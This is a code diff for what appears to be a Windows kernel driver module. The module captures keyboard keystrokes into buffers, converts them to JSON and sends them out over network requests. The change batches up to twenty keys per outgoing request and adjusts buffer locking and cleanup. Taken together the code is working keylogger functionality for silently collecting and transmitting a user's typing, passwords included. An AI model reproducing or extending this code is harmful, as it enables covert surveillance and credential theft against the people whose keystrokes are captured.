@@ -153,7 +153,7 @@ cleanup:
 #define KEY_ID_S_CHARS 0x10
 
 NTSTATUS
-	KbdBufToJson(PKBD_CONTEXT Kbd, PKBD_BUF Buff, char **ppJson)
+	KbdBufKeysToJson(PKBD_CONTEXT Kbd, PKBD_KEY Keys, ULONG KeysCount, char **ppJson)
 {
 	JSON_MAP map;
 	BOOLEAN mapInited = FALSE;
@@ -175,7 +175,7 @@ NTSTATUS
 
 	mapInited = TRUE;
 
-	for (Index = 0; Index < Buff->Length; Index++) {
+	for (Index = 0; Index < KeysCount; Index++) {
 		remains = KEY_ID_S_CHARS;
 		Status = RtlStringCchPrintfExA(keyId, remains, &keyIdEnd, &remains, 0, "%u", Index);
 		if (!NT_SUCCESS(Status)) {
@@ -184,7 +184,7 @@ NTSTATUS
 		}
 
 		keyId[KEY_ID_S_CHARS - 1] = '\0';
-		Status = KbdKeyToJson(&Buff->Keys[Index], &keyJson);
+		Status = KbdKeyToJson(&Keys[Index], &keyJson);
 		if (NT_SUCCESS(Status)) {
 			if (JsonMapSetString(&map, keyId, keyJson)) {
 				KLog(LError, "JsonMapSetString failed for key=%s, value=%s", keyId, keyJson);
@@ -229,12 +229,16 @@ PKBD_BUF KbdAllocBuffer(PKBD_CONTEXT Kbd)
     return Buff;
 }
 
-VOID KbdFreeBuffer(PKBD_CONTEXT Kbd, PKBD_BUF Buff)
+VOID KbdFreeBuffer(PKBD_CONTEXT Kbd, PKBD_BUF Buff, BOOLEAN bLock)
 {
     KIRQL Irql;
-    KeAcquireSpinLock(&Kbd->Lock, &Irql);
-    InsertHeadList(&Kbd->FreeList, &Buff->ListEntry);
-    KeReleaseSpinLock(&Kbd->Lock, Irql);
+	if (bLock)
+	    KeAcquireSpinLock(&Kbd->Lock, &Irql);
+    
+	InsertHeadList(&Kbd->FreeList, &Buff->ListEntry);
+	
+	if (bLock)
+		KeReleaseSpinLock(&Kbd->Lock, Irql);
 }
 
 
@@ -256,17 +260,26 @@ VOID KbdThreadStop(PKBD_CONTEXT Kbd)
     }
 }
 
+#define KBD_KEYS_PER_REQUEST 20
+
 VOID KbdThreadRoutine(PVOID Context)
 {
     PKBD_CONTEXT Kbd = (PKBD_CONTEXT)Context;
     NTSTATUS Status;
     KIRQL Irql;
-    LIST_ENTRY FlushQueue;
     PKBD_BUF Buff;
     PLIST_ENTRY ListEntry;
 	char *BufJson = NULL;
-	
+	PKBD_KEY Keys = NULL;
+	ULONG KeysOffset = 0;
+	BOOLEAN bFlushKeys = FALSE;
+
     KLog(LInfo, "Kbd thread started %p\n", PsGetCurrentThread());
+	Keys = (PKBD_KEY)ExAllocatePoolWithTag(NonPagedPool, KBD_KEYS_PER_REQUEST*sizeof(KBD_KEY), MODULE_TAG);
+	if (Keys == NULL) {
+		KLog(LError, "alloc keys failed");
+		goto cleanup;
+	}
 
     while (TRUE) {
         Status = KeWaitForSingleObject(&Kbd->FlushEvent, Executive, KernelMode, FALSE, NULL);
@@ -274,21 +287,33 @@ VOID KbdThreadRoutine(PVOID Context)
             KLog(LError, "KeWaitForSingleObject failed with err %x\n", Status);
         }
 
-        InitializeListHead(&FlushQueue);
         KeAcquireSpinLock(&Kbd->Lock, &Irql);
         while (!IsListEmpty(&Kbd->FlushQueue)) {
-            ListEntry = RemoveHeadList(&Kbd->FlushQueue);
-            InsertTailList(&FlushQueue, ListEntry);
+            ListEntry = Kbd->FlushQueue.Flink;
+			Buff = CONTAINING_RECORD(ListEntry, KBD_BUF, ListEntry);
+			if (Buff->Length > (KBD_KEYS_PER_REQUEST - KeysOffset)) {
+				bFlushKeys = TRUE;
+			} else {
+				RtlCopyMemory(Keys + KeysOffset, Buff->Keys, Buff->Length*sizeof(KBD_KEY));
+				KeysOffset += Buff->Length;
+				
+				if (KeysOffset == KBD_KEYS_PER_REQUEST)
+					bFlushKeys = TRUE;
+
+				RemoveEntryList(&Buff->ListEntry);
+				KbdFreeBuffer(Kbd, Buff, FALSE);
+			}
+			if (bFlushKeys)
+				break;
         }
         KeReleaseSpinLock(&Kbd->Lock, Irql);
-
-        while (!IsListEmpty(&FlushQueue)) {
-            ListEntry = RemoveHeadList(&FlushQueue);
-            Buff = CONTAINING_RECORD(ListEntry, KBD_BUF, ListEntry);
-            
-			Status = KbdBufToJson(Kbd, Buff, &BufJson);
+		
+		if (bFlushKeys) {
+			Status = KbdBufKeysToJson(Kbd, Keys, KeysOffset, &BufJson);
+			KeysOffset = 0;
+			bFlushKeys = FALSE;
 			if (!NT_SUCCESS(Status)) {
-				KLog(LError, "KbdBufToJson failed err=%x", Status);
+				KLog(LError, "KbdBufKeysToJson failed err=%x", Status);
 				goto next_step;
 			}
 
@@ -298,6 +323,8 @@ VOID KbdThreadRoutine(PVOID Context)
 				ExFreePool(BufJson);
 				goto next_step;
 			}
+			
+			//KLog(LInfo, "BufJson=%s", BufJson);
 
 			request->data = BufJson;
 			request->dataSz = strlen(BufJson);
@@ -307,14 +334,15 @@ VOID KbdThreadRoutine(PVOID Context)
 				SRequestDelete(request);
 				goto next_step;
 			}
+		}
 
 next_step:
-            KbdFreeBuffer(Kbd, Buff);
-        }
-
         if (Kbd->ThreadStop)
             break;
     }
+cleanup:
+	if (Keys != NULL)
+		ExFreePoolWithTag(Keys, MODULE_TAG);
 
     KLog(LInfo, "Kbd thread stopped %p\n", PsGetCurrentThread());
 }
